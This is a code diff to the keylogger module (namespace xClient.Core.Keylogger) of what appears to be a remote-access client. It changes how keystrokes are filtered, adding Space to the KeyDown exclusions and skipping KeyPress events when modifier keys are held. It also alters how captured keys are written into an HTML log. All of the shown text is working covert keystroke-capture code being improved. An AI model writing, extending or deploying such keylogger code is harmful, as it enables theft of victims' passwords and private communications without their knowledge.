@@ -112,12 +112,13 @@ namespace xClient.Core.Keylogger
             // The keys below are excluded. If it is one of the keys below,
             // the KeyPress event will handle these characters. If the keys
             // are not any of those specified below, we can continue.
-            if (!((e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z)
-            || (e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.Divide)
-            || (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9)
-            || (e.KeyCode >= Keys.Oem1 && e.KeyCode <= Keys.OemClear
-            || (e.KeyCode >= Keys.LShiftKey && e.KeyCode <= Keys.RShiftKey)
-            || (e.KeyCode == Keys.CapsLock))))
+            if (!(e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z
+            || e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.Divide
+            || e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9
+            || e.KeyCode >= Keys.Oem1 && e.KeyCode <= Keys.OemClear
+            || e.KeyCode >= Keys.LShiftKey && e.KeyCode <= Keys.RShiftKey
+            || e.KeyCode == Keys.CapsLock
+            || e.KeyCode == Keys.Space))
             {
                 // The key was not part of the keys that we wish to filter, so
                 // be sure to prevent a situation where multiple keys are pressed.
@@ -131,6 +132,9 @@ namespace xClient.Core.Keylogger
         //This method should be used to process all of our unicode characters
         private void Logger_KeyPress(object sender, KeyPressEventArgs e) //Called second
         {
+            if (ModifierKeysSet())
+                return;
+
             if (!_pressedKeyChars.Contains(e.KeyChar))
             {
                 _pressedKeyChars.Add(e.KeyChar);
@@ -195,9 +199,6 @@ namespace xClient.Core.Keylogger
 
                 switch (names[i])
                 {
-                    case "Space":
-                        normalKeys.Append("&nbsp;");
-                        break;
                     case "Return":
                         normalKeys.Append(@"<p class=""h"">[Enter]</p><br>");
                         break;
